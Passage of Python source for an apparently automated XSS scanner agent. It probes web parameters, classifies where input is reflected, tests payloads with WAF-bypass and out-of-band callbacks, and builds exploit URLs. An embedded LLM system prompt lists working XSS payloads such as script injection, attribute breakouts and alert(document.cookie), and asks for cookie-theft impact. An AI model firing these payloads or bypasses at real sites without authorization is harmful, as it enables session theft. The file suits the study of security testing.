            context_data, surviving_chars, reflection_type, status_code
        )

        hybrid_payloads = self._hybrid_get_adaptive_payloads(
            probe_result, reflection_type, raw_payloads
        )

        # Q-Learning WAF bypass
        if self._detected_waf:
            original_count = len(hybrid_payloads)
            hybrid_payloads = await self._get_waf_optimized_payloads(hybrid_payloads, max_variants=3)
            logger.info(f"[{self.name}] 🧠 Q-Learning WAF bypass: {original_count} → {len(hybrid_payloads)} payloads")

        logger.info(f"[{self.name}] ⚡ Adaptive Strategy: Testing {len(hybrid_payloads)} payloads for {param}...")

        return await self._test_payload_list(
            param, hybrid_payloads, interactsh_url, screenshots_dir,
            reflection_type, surviving_chars, injection_ctx
        )

    async def _payload_test_single(
        self,
        param: str,
        reflected_payload: str,
        is_encoded: bool,
        ref_context: str,
        screenshots_dir: Path,
        injection_ctx: Any
    ) -> Tuple[bool, Optional[Dict], Optional[Dict]]:
        """Test a single payload and return validation result."""
        dashboard.set_current_payload(reflected_payload[:60], "XSS Hybrid", "Validating")

        # Authority check for unencoded dangerous reflections
        # RELAXED: If it's a BUGTRACE payload, we trust it blindly if unencoded
        is_bugtrace_payload = "BUGTRACE" in reflected_payload
        dangerous_contexts = ["html_text", "attribute_unquoted", "script", "tag_name"]
        
        if not is_encoded and (ref_context in dangerous_contexts or is_bugtrace_payload):
            finding = self._create_authority_finding(
                param, reflected_payload, ref_context, injection_ctx
            )
            return True, None, {"finding": finding}

        # Browser validation
        validated, evidence = await self._validate(
            param, reflected_payload, "", screenshots_dir
        )

        if validated:
            finding_data = {
                "evidence": evidence,
                "screenshot_path": evidence.get("screenshot_path"),
                "context": "hybrid_payload",
                "reflection_context": ref_context
            }
            return True, evidence, finding_data

        return False, None, None

    def _payload_check_early_stop(
        self,
        reflected_payload: str,
        evidence: Dict,
        successful_count: int
    ) -> bool:
        """Check if testing should stop early after successful payload."""
        should_stop, stop_reason = self._should_stop_testing(
            reflected_payload, evidence, successful_count
        )
        return should_stop

    def _payload_process_validation_result(
        self,
        validated: bool,
        finding_data: Optional[Dict],
        reflected_payload: str,
        evidence: Optional[Dict],
        reflection_type: str,
        successful_payloads: List[str],
        best_state: Dict
    ) -> Tuple[List[str], Dict]:
        """Process validation result and update tracking state."""
        if not validated or not self._should_create_finding(finding_data):
            return successful_payloads, best_state

        self.payload_learner.save_success(reflected_payload, reflection_type, self.url)
        successful_payloads.append(reflected_payload)

        if not best_state.get("payload"):
            best_state = {
                "payload": reflected_payload,
                "evidence": evidence,
                "finding_data": finding_data
            }

        return successful_payloads, best_state

    async def _payload_run_reflection_checks(
        self,
        param: str,
        hybrid_payloads: List[str],
        interactsh_url: str
    ) -> Optional[List[Dict]]:
        """Prepare payloads and run fast reflection check."""
        valid_payloads = [p.replace("{{interactsh_url}}", interactsh_url) for p in hybrid_payloads]
        return await self._fast_reflection_check(self.url, param, valid_payloads)

    def _payload_build_final_finding(
        self,
        param: str,
        best_state: Dict,
        reflection_type: str,
        surviving_chars: str,
        successful_payloads: List[str],
        injection_ctx: Any
    ) -> XSSFinding:
        """Build final XSS finding from successful payloads."""
        return self._create_xss_finding(
            param, best_state["payload"], best_state["finding_data"].get("context", "hybrid_payload"),
            "interactsh", best_state["evidence"], 1.0,
            reflection_type, surviving_chars, successful_payloads,
            injection_ctx, "hybrid_optimized",
            "Hybrid strategy found a working payload from known patterns."
        )

    async def _test_payload_list(
        self,
        param: str,
        hybrid_payloads: List[str],
        interactsh_url: str,
        screenshots_dir: Path,
        reflection_type: str,
        surviving_chars: str,
        injection_ctx: Any
    ) -> Optional[XSSFinding]:
        """Test a list of payloads and return first successful finding."""
        successful_payloads = []
        best_state = {}

        reflection_results = await self._payload_run_reflection_checks(
            param, hybrid_payloads, interactsh_url
        )

        if not reflection_results:
            return None

        for ref in reflection_results:
            if self._max_impact_achieved:
                break

            reflected_payload = ref["payload"]
            validated, evidence, finding_data = await self._payload_test_single(
                param, reflected_payload, ref.get("encoded", True),
                ref.get("context", "unknown"), screenshots_dir, injection_ctx
            )

            # Handle authority finding (early return)
            if validated and finding_data and "finding" in finding_data:
                return finding_data["finding"]

            successful_payloads, best_state = self._payload_process_validation_result(
                validated, finding_data, reflected_payload, evidence,
                reflection_type, successful_payloads, best_state
            )

            if validated and self._payload_check_early_stop(reflected_payload, evidence, len(successful_payloads)):
                break

        if successful_payloads:
            return self._payload_build_final_finding(
                param, best_state, reflection_type, surviving_chars,
                successful_payloads, injection_ctx
            )

        return None

    def _create_xss_finding(
        self, param: str, payload: str, context: str, validation_method: str,
        evidence: Dict, confidence: float, reflection_type: str, surviving_chars: str,
        successful_payloads: List[str], injection_ctx: Any, bypass_technique: str,
        bypass_explanation: str
    ) -> XSSFinding:
        """Create an XSSFinding with all required fields."""
        status, validated = self._determine_validation_status(
            {"evidence": evidence, "reflection_context": reflection_type}
        )

        return XSSFinding(
            url=self.url,
            parameter=param,
            payload=payload,
            context=context,
            validation_method=validation_method,
            evidence=evidence,
            confidence=confidence,
            status=status,
            validated=validated,
            screenshot_path=evidence.get("screenshot_path"),
            reflection_context=reflection_type,
            surviving_chars=surviving_chars,
            successful_payloads=successful_payloads,
            xss_type="reflected",
            injection_context_type=injection_ctx.type,
            vulnerable_code_snippet=injection_ctx.code_snippet,
            server_escaping=getattr(self, '_last_server_escaping', {}),
            escape_bypass_technique=bypass_technique,
            bypass_explanation=bypass_explanation,
            exploit_url=self.build_exploit_url(self.url, param, payload, encoded=False),
            exploit_url_encoded=self.build_exploit_url(self.url, param, payload, encoded=True),
            verification_methods=self.generate_verification_methods(self.url, param, injection_ctx, payload),
            verification_warnings=self.get_verification_warnings(injection_ctx),
            reproduction_steps=self.generate_repro_steps(self.url, param, injection_ctx, payload)
        )

    def _create_authority_finding(
        self, param: str, payload: str, ref_context: str, injection_ctx: Any
    ) -> XSSFinding:
        """Create finding for authority-confirmed XSS (unencoded reflection)."""
        evidence = {
            "payload": payload,
            "unencoded_reflection": True,
            "reflection_context": ref_context,
            "description": f"Reflected without encoding in {ref_context} context (Go Fuzzer Authority)."
        }

        return XSSFinding(
            url=self.url,
            parameter=param,
            payload=payload,
            context="reflected_unencoded",
            validation_method="go_fuzzer_authority",
            evidence=evidence,
            confidence=1.0,
            status="VALIDATED_CONFIRMED",
            reflection_context=ref_context,
            xss_type="reflected",
            injection_context_type=injection_ctx.type,
            vulnerable_code_snippet=injection_ctx.code_snippet,
            server_escaping=getattr(self, '_last_server_escaping', {}),
            escape_bypass_technique="none_needed",
            bypass_explanation="Payload was reflected without encoding.",
            exploit_url=self.build_exploit_url(self.url, param, payload, encoded=False),
            exploit_url_encoded=self.build_exploit_url(self.url, param, payload, encoded=True),
            verification_methods=self.generate_verification_methods(self.url, param, injection_ctx, payload),
            verification_warnings=self.get_verification_warnings(injection_ctx),
            reproduction_steps=self.generate_repro_steps(self.url, param, injection_ctx, payload)
        )

    async def _param_probe_and_setup(
        self,
        param: str
    ) -> Optional[Tuple]:
        """Phase 1: Probe target and prepare context."""
        probe_result = await self._probe_and_analyze_context(param)
        if probe_result[0] is None:
            return None

        html, probe_url, status_code, context_data, reflection_type, surviving_chars, injection_ctx = probe_result

        # Cache server escaping for finding creation
        self._last_server_escaping = await self.analyze_server_escaping(self.url, param)

        # Get interactsh URL
        interactsh_url = self.interactsh.get_payload_url("xss", param)

        return (html, probe_url, status_code, context_data, reflection_type,
                surviving_chars, injection_ctx, interactsh_url)

    async def _param_try_fragment_xss(
        self,
        param: str,
        interactsh_url: str
    ) -> Optional[XSSFinding]:
        """Phase 4: Try fragment XSS if WAF detected or reflection blocked."""
        dashboard.log(f"[{self.name}] 🔗 Trying FRAGMENT XSS (Heuristic)...", "WARN")

        fragment_payloads = [
            fp.replace("{{interactsh_url}}", interactsh_url)
            for fp in self.FRAGMENT_PAYLOADS
        ]

        if not fragment_payloads:
            return None

        return XSSFinding(
            url=self.url,
            parameter=param,
            payload=fragment_payloads[0],
            context="fragment_xss_potential",
            validation_method="fragment_bypass",
            evidence={
                "reason": "WAF blocked query params, fragment bypass detected",
                "all_payloads": fragment_payloads,
                "needs_cdp": False  # v3.2.1: CDP disabled
            },
            confidence=0.7,
            status="VALIDATED_CONFIRMED",  # v3.2.1: Direct to reporting
            validated=False,
            reflection_context="fragment",
            successful_payloads=fragment_payloads,
            xss_type="dom-based",
            injection_context_type="url_fragment",
            vulnerable_code_snippet="location.hash sink",
            server_escaping=self._last_server_escaping,
            escape_bypass_technique="fragment_injection",
            bypass_explanation="Payload injected via URL fragment to avoid server-side WAF.",
            exploit_url=self.build_exploit_url(self.url, param, fragment_payloads[0], encoded=False),
            exploit_url_encoded=self.build_exploit_url(self.url, param, fragment_payloads[0], encoded=True),
            verification_methods=[{
                "type": "cdp",
                "name": "Browser Verification",
                "instructions": "Must use browser",
                "url_encoded": self.build_exploit_url(self.url, param, fragment_payloads[0], encoded=True)
            }],
            verification_warnings=["Fragment XSS requires browser interaction"],
            reproduction_steps=["Open URL in browser", "Check for execution"]
        )

    def _llm_prepare_finding_data(
        self,
        evidence: Dict,
        llm_response: Dict,
        reflection_type: str
    ) -> Dict:
        """Prepare finding data from LLM response."""
        return {
            "evidence": evidence,
            "screenshot_path": evidence.get("screenshot_path"),
            "context": llm_response.get("context", "unknown"),
            "reflection_context": reflection_type
        }

    async def _param_test_llm_payload(
        self,
        param: str,
        html: str,
        interactsh_url: str,
        context_data: Dict,
        screenshots_dir: Path,
        reflection_type: str,
        surviving_chars: str,
        injection_ctx: InjectionContext
    ) -> Optional[XSSFinding]:
        """Phase 5: LLM analysis and payload testing."""
        llm_response = await self._llm_get_payload_from_response(
            html, param, interactsh_url, context_data
        )

        if not llm_response or not llm_response.get("vulnerable"):
            return None

        payload = llm_response.get("payload", "")
        validation_method = llm_response.get("validation_method", "interactsh")

        dashboard.set_current_payload(payload[:60], "XSS", "Testing")

        response_html = await self._send_payload(param, payload)
        if not response_html:
            return None

        validated, evidence = await self._validate(
            param, payload, response_html, screenshots_dir
        )

        if not validated:
            return None

        finding_data = self._llm_prepare_finding_data(evidence, llm_response, reflection_type)

        if not self._should_create_finding(finding_data):
            return None

        return self._create_xss_finding(
            param, payload, llm_response.get("context", "unknown"),
            validation_method, evidence, llm_response.get("confidence", 0.9),
            reflection_type, surviving_chars, [payload],
            injection_ctx, "context_aware",
            llm_response.get("reasoning", "LLM generated context-aware payload.")
        )

    def _bypass_prepare_finding_data(
        self,
        evidence: Dict,
        bypass_response: Dict,
        reflection_type: str
    ) -> Dict:
        """Prepare finding data from bypass response."""
        return {
            "evidence": evidence,
            "screenshot_path": evidence.get("screenshot_path"),
            "context": bypass_response.get("strategy", "bypass"),
            "reflection_context": reflection_type
        }

    async def _param_try_bypass_attempts(
        self,
        param: str,
        payload: str,
        response_html: str,
        interactsh_url: str,
        validation_method: str,
        screenshots_dir: Path,
        reflection_type: str,
        surviving_chars: str,
        injection_ctx: InjectionContext
    ) -> Optional[XSSFinding]:
        """Phase 6: Bypass attempts if initial payload failed."""
        max_attempts = self._bypass_determine_max_attempts()

        for attempt in range(max_attempts):
            bypass_response = await self._llm_generate_bypass(
                payload, response_html[:50000], interactsh_url
            )

            if not bypass_response or not bypass_response.get("bypass_payload"):
                break

            bypass_payload = bypass_response.get("bypass_payload")
            dashboard.set_current_payload(bypass_payload[:60], "XSS Bypass", "Testing")

            response_html = await self._send_payload(param, bypass_payload)
            validated, evidence = await self._validate(
                param, bypass_payload, response_html, screenshots_dir
            )

            if not validated:
                continue

            finding_data = self._bypass_prepare_finding_data(evidence, bypass_response, reflection_type)

            if not self._should_create_finding(finding_data):
                continue

            return self._create_xss_finding(
                param, bypass_payload, bypass_response.get("strategy", "bypass"),
                validation_method, evidence, 0.95,
                reflection_type, surviving_chars, [bypass_payload],
                injection_ctx, "waf_bypass",
                bypass_response.get("reasoning", "LLM generated WAF bypass.")
            )

        return None

    async def _param_test_phases_3_4_5(
        self,
        param: str,
        interactsh_url: str,
        screenshots_dir: Path,
        reflection_type: str,
        surviving_chars: str,
        context_data: Dict,
        html: str,
        status_code: int,
        injection_ctx: Any
    ) -> Optional[XSSFinding]:
        """Execute phases 3-5: Hybrid payloads, fragment XSS, and LLM analysis."""
        # Phase 3: Hybrid Payloads (Fallback)
        hybrid_finding = await self._test_hybrid_payloads(
            param, interactsh_url, screenshots_dir, reflection_type,
            surviving_chars, context_data, status_code, injection_ctx
        )
        if hybrid_finding:
            return hybrid_finding

        # Phase 4: Fragment XSS (Special case for WAF bypass)
        should_try_fragment = (
            self.consecutive_blocks > 2 or
            not context_data.get("reflected") or
            self._detected_waf is not None
        )

        if should_try_fragment:
            fragment_finding = await self._param_try_fragment_xss(param, interactsh_url)
            if fragment_finding:
                return fragment_finding

        # Phase 5: LLM Analysis (Expensive fallback)
        if not context_data.get("reflected") and not self._detected_waf:
            logger.info(f"[{self.name}] ⚡ OPTIMIZATION: Skipping LLM analysis")
            return None

        return await self._param_test_llm_payload(
            param, html, interactsh_url, context_data, screenshots_dir,
            reflection_type, surviving_chars, injection_ctx
        )

    async def _test_parameter(
        self,
        param: str,
        interactsh_domain: str,
        screenshots_dir: Path
    ) -> Optional[XSSFinding]:
        """Test a single parameter for XSS.

        Uses Pipeline V2 (Bombardment-First) as primary strategy.
        Falls back to legacy approach if Pipeline V2 fails.
        """
        dashboard.log(f"[{self.name}] 🔬 Testing param: {param}", "INFO")
        dashboard.set_status("XSS Analysis", f"Testing {param}")

        # =====================================================================
        # PRIMARY STRATEGY: Pipeline V2 (Bombardment-First)
        # Philosophy: Fire ALL payloads first, analyze what reflected, amplify
        # =====================================================================
        try:
            finding = await self._run_pipeline_v2(
                param=param,
                interactsh_domain=interactsh_domain,
                screenshots_dir=screenshots_dir
            )
            if finding:
                dashboard.log(f"[{self.name}] ✅ Pipeline V2 found XSS!", "SUCCESS")
                return finding
        except Exception as e:
            logger.warning(f"[{self.name}] Pipeline V2 error: {e}, falling back to legacy")

        # =====================================================================
        # FALLBACK: Legacy approach (probe-first)
        # Only used if Pipeline V2 fails completely
        # =====================================================================
        dashboard.log(f"[{self.name}] 📜 Trying legacy approach for '{param}'", "INFO")

        # Phase 1: Probe and setup
        probe_data = await self._param_probe_and_setup(param)
        if not probe_data:
            return None

        html, probe_url, status_code, context_data, reflection_type, surviving_chars, injection_ctx, interactsh_url = probe_data

        # Phase 2: LLM Smart DOM Analysis (Primary Strategy)
        smart_finding = await self._test_smart_llm_payloads(
            param, html, context_data, interactsh_url, screenshots_dir,
            reflection_type, surviving_chars, injection_ctx
        )
        if smart_finding:
            return smart_finding

        # Phases 3-5: Hybrid, Fragment, LLM Analysis
        return await self._param_test_phases_3_4_5(
            param, interactsh_url, screenshots_dir, reflection_type,
            surviving_chars, context_data, html, status_code, injection_ctx
        )

    def _clean_payload(self, payload: str, param: str) -> str:
        """
        Cleans the payload by removing common hallucinations and LLM pollution.
        """
        if not payload:
            return ""
            
        import re
        cleaned = payload.strip()
        
        # 1. Remove Markdown code blocks (```javascript ... ``` or ```html ... ```)
        cleaned = re.sub(r'```[a-z]*\n?(.*?)\n?```', r'\1', cleaned, flags=re.DOTALL)
        
        # 2. Remove inline code backticks
        cleaned = cleaned.strip('`')
        
        # 3. Remove common prefixes like "Payload:", "Vector:", "**Second**:", etc.
        cleaned = re.sub(r'^(payload|vector|bypass|solution|new payload|\*\*.*?\*\*)\s*:\s*', '', cleaned, flags=re.IGNORECASE)
        
        # 4. Remove param prefix hallucination (e.g. searchTerm=...)
        param_pattern = re.compile(f"^{re.escape(param)}=", re.IGNORECASE)
        cleaned = param_pattern.sub("", cleaned).strip()
        
        # 5. Remove any leftover XML tags that XmlParser might have missed in a messy response
        cleaned = re.sub(r'</?payload>', '', cleaned, flags=re.IGNORECASE)
        
        # 6. Final strip of quotes
        if (cleaned.startswith('"') and cleaned.endswith('"')) or \
           (cleaned.startswith("'") and cleaned.endswith("'")):
            cleaned = cleaned[1:-1]
            
        return cleaned

    def _is_valid_url(self, url: str) -> bool:
        """Validate URL before making requests. (Stability Improvement #3)"""
        from urllib.parse import urlparse
        try:
            result = urlparse(url)
            return all([result.scheme in ['http', 'https'], result.netloc])
        except Exception as e:
            logger.debug(f"_is_valid_url failed: {e}")
            return False

    async def _probe_parameter(self, param: str) -> Tuple[str, str, int]:
        """Send probe string and get HTML response."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        parsed = urlparse(self.url)
        params = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(parsed.query).items()}
        params[param] = self.PROBE_STRING
        
        probe_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(params), parsed.fragment
        ))
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
        }
        
        try:
            # Use HTTPClientManager for proper connection management (v2.4)
            async with http_manager.session(ConnectionProfile.PROBE) as session:
                async with session.get(probe_url, headers=headers, ssl=False) as resp:
                    html = await resp.text()
                    logger.info(f"[{self.name}] Probe status: {resp.status} for {probe_url}")
                    return html, probe_url, resp.status
        except Exception as e:
            logger.warning(f"[{self.name}] Probe failed (WAF suspected) for {probe_url}: {e}")
            # If probe fails (WAF drops connection or blocks), we return specific flags
            # allowing the main loop to try "Stealth Mode" or "Blind Golden Payloads"
            # Return empty HTML but valid URL to ensure the loop continues
            return "", probe_url, 0

    def _analyze_reflection_context(
        self, html: str, probe_prefix: str, marker: Optional[str] = None
    ) -> Dict:
        """Analyze WHERE a probe reflected in `html`.

        `marker` is the literal string to LOCATE in the document. It defaults to
        `_LEGACY_PROBE_MARKER` rather than to `probe_prefix` ON PURPOSE: four of this
        method's six call sites pass a full PAYLOAD as `probe_prefix` (an LLM payload, a
        reflecting payload, the multi-char PROBE_STRING), and a payload is exactly the
        thing the server mangles, so searching for it verbatim would flip those sites from
        reflected=True to reflected=False — a silent recall regression. Callers that hold a
        real, survives-serialisation MARKER pass it explicitly; L1 does, which is what makes
        `url_context`/`href` reachable at all (the OMNI marker is not `BT7331`, so the
        hardcoded search always said "none" and the browser-only hatch could never open).

        Returns `contexts`: EVERY label the probe reflected in, not only the ranked winner.
        Collapsing to one label is what hid `url_context` (ranked 8th of 9) behind an inert
        html_text copy of the same value.
        """
        search = marker or _LEGACY_PROBE_MARKER
        is_blocked = self._is_waf_blocked(html)

        # Early return if probe not reflected
        if search not in (html or ""):
            return {
                "reflected": False,
                "is_blocked": is_blocked,
                "context": "blocked" if is_blocked else "none",
                "contexts": [],
            }

        # Find every context via BeautifulSoup, then rank.
        # NOTE: no "surviving_chars" key is emitted here. Which characters survived can only
        # be decided against what was SENT, which this method does not know — the L0.5
        # delimited char probe measures it properly (self._surviving_chars). Omitting the
        # key leaves every consumer on its own "unknown" default, which means "fire
        # everything" (tag_closing_breakout_payloads, payload_batches) — never a narrower set.
        contexts = self._find_reflection_contexts(html, search)

        return {
            "reflected": True,
            "context": most_exploitable_context(contexts),
            "contexts": contexts,
            "probe_found": True,
            "snippet": self._reflection_snippet(html, search),
            "is_blocked": is_blocked
        }

    def _is_waf_blocked(self, html: str) -> bool:
        """Check if response contains WAF block signatures."""
        lower_html = (html or "").lower()
        block_signatures = ["blocked:", "waf block", "security violation", "forbidden", "not acceptable", "access denied"]
        return any(sig in lower_html for sig in block_signatures)

    def _reflection_snippet(self, html: str, marker: str) -> str:
        """The HTML immediately around the first reflection of `marker`.

        The L1 → L3 hand-off has always read a "snippet" key that nothing ever produced, so
        the L3 LLM prompt received an EMPTY document sample for every parameter of every
        scan. Returning the real window is what that caller already asks for.
        """
        idx = (html or "").find(marker)
        if idx < 0:
            return ""
        start = max(0, idx - _REFLECTION_SNIPPET_RADIUS)
        end = min(len(html), idx + len(marker) + _REFLECTION_SNIPPET_RADIUS)
        return html[start:end]

    def _find_reflection_contexts(self, html: str, prefix: str) -> List[str]:
        """EVERY HTML context the probe reflected in — all text nodes AND all attributes.

        A parameter commonly reflects in several places at once (page title, an
        <input value="...">, an <a href="...">, the body). Attribute values are never
        NavigableStrings, so find_all(string=...) can never see them: they are scanned
        separately instead of only as a no-text-node fallback.

        The full list is what callers that must not lose a signal need — most notably the
        browser-only escalation hatch, for which a single `url_context` anywhere in the
        list is decisive even though the ranking would bury it under html_text.
        """
        from bs4 import BeautifulSoup

        try:
            soup = BeautifulSoup(html, 'html.parser')
            contexts = [
                self._context_from_text_node(node)
                for node in soup.find_all(string=lambda t: t and prefix in t)
            ]
            contexts.extend(self._contexts_from_soup_attributes(soup, prefix))

            if not contexts:
                # Nothing parsed (malformed markup / probe inside an unparsed region):
                # fall back to the raw-string attribute heuristics.
                return [self._context_from_attributes(html, prefix)]

            return contexts

        except Exception as e:
            logger.debug(f"operation failed: {e}")
            return ["unknown"]

    def _context_from_text_node(self, text_node) -> str:
        """Determine context from text node parent."""
        from bs4 import Comment
        # find_all(string=...) also returns comments — they are NavigableStrings too.
        if isinstance(text_node, Comment):
            return "comment"
        parent = getattr(text_node.parent, "name", None)
        if parent in ['script', 'style']:
            return parent
        # RCDATA/RAWTEXT elements (HTML standard): markup inside them is NOT parsed as
        # tags, so this is text, not executable body HTML. Same vocabulary as the sibling
        # pure module (agents/xss/analysis.py) so the labels stay consistent.
        if parent in _RAW_TEXT_ELEMENTS:
            return "raw_text"
        return "html_text"

    def _contexts_from_soup_attributes(self, soup, prefix: str) -> List[str]:
        """Context label for every ATTRIBUTE value carrying the probe."""
        contexts: List[str] = []
        for tag in soup.find_all(True):
            for attr, value in (tag.attrs or {}).items():
                # bs4 returns multi-valued attributes (class, rel, ...) as lists
                raw = " ".join(v for v in value if isinstance(v, str)) if isinstance(value, list) else value
                if not isinstance(raw, str) or prefix not in raw:
                    continue
                name = (attr or "").lower()
                if name.startswith("on"):
                    contexts.append("event_handler")
                # The (element, attribute) PAIR decides this, not the attribute name: only
                # attributes whose processing model is NAVIGATE can ever run a reflection,
                # and `url_context` is what opens the browser-escalation hatch. Keying on
                # the bare name labelled `<link rel=canonical href>` and `<img src>` — which
                # FETCH, and are measurably inert — as browser-only, forcing a Playwright
                # pass and a CDP session on an escaped reflection that can never execute.
                elif (_element_name((tag.name or "").lower()), name) in _NAVIGATING_URL_ATTRIBUTES:
                    contexts.append("url_context")
                else:
                    contexts.append("attribute_value")
        return contexts

    def _context_from_attributes(self, html: str, prefix: str) -> str:
        """Determine context from attribute heuristics."""
        if f"={prefix}" in html or f'="{prefix}' in html or f"='{prefix}" in html:
            return "attribute_value"
        elif f"<!-- {prefix}" in html or f"<!--{prefix}" in html:
            return "comment"
        elif f"<{prefix}" in html:
            return "tag_name"
        return "unknown"
    def _filter_payloads_by_context(self, payloads: List[str], context: str) -> List[str]:
        """
        Filters and prioritizes payloads based on the detected reflection context.
        This prevents testing 800+ payloads when only ~50 are relevant.
        """
        # For unknown/blocked contexts, use broader set. Contexts without a dedicated
        # relevance rule (raw_text, event_handler, url_context, ...) also take this path:
        # falling through to _is_payload_relevant() would filter EVERYTHING out and leave
        # only the 10-payload safety net, silently cutting recall.
        if (context.startswith("unknown") or context in ["waf_blocked", "blocked"]
                or context not in _FILTERABLE_CONTEXTS):
            return payloads[:100]

        # Filter by context relevance
        filtered = [p for p in payloads if self._is_payload_relevant(p, context)]

        # Add safety net of top killer payloads
        filtered = self._add_safety_net_payloads(filtered, payloads)

        # Limit to 100 max to keep it fast
        return filtered[:100]

    def _is_payload_relevant(self, payload: str, context: str) -> bool:
        """Check if payload is relevant for the given context."""
        p_lower = payload.lower()

        if context == "script":
            return self._is_relevant_for_script_context(payload, p_lower)
        if context == "html_text":
            return any(payload.startswith(x) for x in ["<", "\">", "'>", "{{", "[["])
        if context == "attribute_value":
            return any(p_lower.startswith(x) for x in ["on", "\"", "'", " javascript:", "data:"])
        if context == "comment":
            return "-->" in payload or "--!>" in payload
        if context == "style":
            return any(x in payload for x in ["</style>", "expression", "url", "'", "\""])
        if context == "tag_name":
            return any(x in payload for x in [" ", ">", "/"])

        return False

    def _has_script_breakout_chars(self, payload: str) -> bool:
        """Check if payload contains script breakout characters."""
        breakout_chars = ["'", "\"", "</script>", ";", "-", "+", "*", "\\"]
        return any(x in payload for x in breakout_chars)

    def _is_html_tag_with_breakout(self, payload: str, p_lower: str) -> bool:
        """Check if HTML tag has proper breakout."""
        if not payload.startswith("<"):
            return True  # Not HTML tag, allow
        if p_lower.startswith("</script>"):
            return True  # Script closing tag, allow
        # Check if has quote before tag (breakout)
        return any(payload.startswith(q) for q in ["'", "\"", "'; ", "\"; "])

    def _is_relevant_for_script_context(self, payload: str, p_lower: str) -> bool:
        """Check if payload is relevant for script context."""
        if not self._has_script_breakout_chars(payload):
            return False
        return self._is_html_tag_with_breakout(payload, p_lower)

    def _add_safety_net_payloads(self, filtered: List[str], all_payloads: List[str]) -> List[str]:
        """Add top killer payloads as safety net if not already included."""
        safety_net = all_payloads[:10]
        for sn in safety_net:
            if sn not in filtered:
                filtered.append(sn)
        return filtered


    def _analyze_global_context(self, html: str) -> str:
        """
        Analyze the full HTML for global technology signatures (Angular, React, Vue, jQuery).
        This provides 'Sniper' context for frameworks.
        """
        if not html:
            return "No HTML content"
            
        context = []
        lower_html = html.lower()
        
        # AngularJS 1.x
        if "ng-app" in lower_html or "angular.js" in lower_html or "angular.min.js" in lower_html or "angular_1" in lower_html:
            context.append("AngularJS (CSTI Risk!)")
            
        # React
        if "react" in lower_html and "component" in lower_html:
            context.append("React")
            
        # Vue
        if "vue.js" in lower_html or "vue.min.js" in lower_html or "v-if" in lower_html:
            context.append("Vue.js")
            
        # jQuery
        if "jquery" in lower_html:
            context.append("jQuery")
            
        return ", ".join(context) if context else "Vanilla JS / Unknown"

    # =========================================================================
    # LLM AS BRAIN: Smart DOM Analysis (Primary Strategy)
    # =========================================================================

    def _dom_build_system_prompt(self) -> str:
        """Build system prompt for DOM XSS analysis (LLM template string)."""
        return """You are an elite XSS specialist. Your job is to analyze HTML and generate PRECISE payloads.

CRITICAL: You must understand the EXACT DOM structure to escape correctly.

Example 1 - Inside a div:
```html
<div class="container"><span>USER_INPUT</span></div>
```
Correct payload: `</span></div><script>alert(document.cookie)</script>`
Why: Must close </span> AND </div> before injecting script.

Example 2 - Inside an attribute:
```html
<input value="USER_INPUT" type="text">
```
Correct payload: `" onfocus="alert(document.cookie)" autofocus x="`
Why: Close the value attribute, inject event handler, autofocus triggers it.

Example 3 - Inside JavaScript string:
```html
<script>var x = "USER_INPUT";</script>
```
Correct payload: `";alert(document.cookie);//`
Why: Close string, inject code, comment out rest.

Example 4 - Inside JavaScript with escaping:
```html
<script>var x = 'USER_INPUT';</script>
```
If backslash survives: `\';alert(document.cookie);//`
If not: Try closing script tag: `</script><script>alert(document.cookie)</script>`

RULES:
1. ALWAYS analyze the exact DOM structure first
2. Identify ALL tags that need closing before your payload
3. Generate payloads that include document.cookie or document.domain for maximum impact
4. If < > are filtered, use event handlers or javascript: protocol
5. Generate 1-3 payloads ranked by likelihood of success"""

    def _dom_build_user_prompt(
        self,
        html: str,
        param: str,
        probe_string: str,
        interactsh_url: str,
        context_data: Dict,
        dom_snippet: str
    ) -> str:
        """Build user prompt for DOM XSS analysis (LLM template string)."""
        return f"""Analyze this HTML and generate XSS payloads:

TARGET URL: {self.url}
PARAMETER: {param}
PROBE STRING: {probe_string}
CALLBACK URL (for OOB validation): {interactsh_url}

REFLECTION CONTEXT:
- Type: {context_data.get('context', 'unknown')}
- Surviving characters: {context_data.get('surviving_chars', 'unknown')}
- In blocked/WAF: {context_data.get('is_blocked', False)}

DOM SNIPPET (around reflection point):
```html
{dom_snippet}
```

FULL HTML (for context):
```html
{html[:8000]}
```

Generate 1-3 PRECISE XSS payloads. For each payload explain:
1. What tags/attributes need to be escaped
2. Why this specific payload will work
3. Expected impact (cookie theft, domain access, etc.)

Response format (XML):
<analysis>Your DOM structure analysis</analysis>
<payloads>
  <payload>
    <code>THE_PAYLOAD_HERE</code>
    <reasoning>Why it works</reasoning>
    <impact>cookie_theft|domain_access|execution</impact>
    <confidence>0.0-1.0</confidence>
  </payload>
  <!-- More payloads if needed -->
</payloads>"""

    def _dom_log_generated_payloads(self, payloads: List[Dict]):
        """Log generated payloads to dashboard."""
        logger.info(f"[{self.name}] 🧠 LLM Brain generated {len(payloads)} precision payloads")
        for i, p in enumerate(payloads):
            dashboard.log(
                f"[{self.name}] 🎯 Smart Payload #{i+1}: {p['payload'][:50]}... (conf: {p['confidence']})",
                "INFO"
            )

    async def _dom_call_llm(self, system_prompt: str, user_prompt: str) -> Optional[str]:
        """Call LLM for DOM analysis."""
        return await llm_client.generate(
            prompt=user_prompt,
            module_name="XSS_SMART_ANALYSIS",
            system_prompt=system_prompt,
            model_override=settings.MUTATION_MODEL,
            max_tokens=4000,
            temperature=0.3
        )

    async def _llm_smart_dom_analysis(
        self,
        html: str,
        param: str,
        probe_string: str,
        interactsh_url: str,
        context_data: Dict
    ) -> List[Dict]:
        """
        LLM-First Strategy: Analyze DOM structure and generate targeted payloads.

        Instead of trying 50+ generic payloads, the LLM:
        1. Parses the exact DOM structure around the reflection point
        2. Identifies what tags/attributes need to be escaped
        3. Generates 1-3 precision payloads for the exact context

        Returns:
            List of payload dicts with: payload, reasoning, confidence
        """
        dom_snippet = self._extract_dom_around_reflection(html, probe_string)

        system_prompt = self._dom_build_system_prompt()
        user_prompt = self._dom_build_user_prompt(
            html, param, probe_string, interactsh_url, context_data, dom_snippet
        )

        try:
            response = await self._dom_call_llm(system_prompt, user_prompt)

            if not response:
                logger.warning(f"[{self.name}] LLM Smart Analysis returned empty response")
                return []

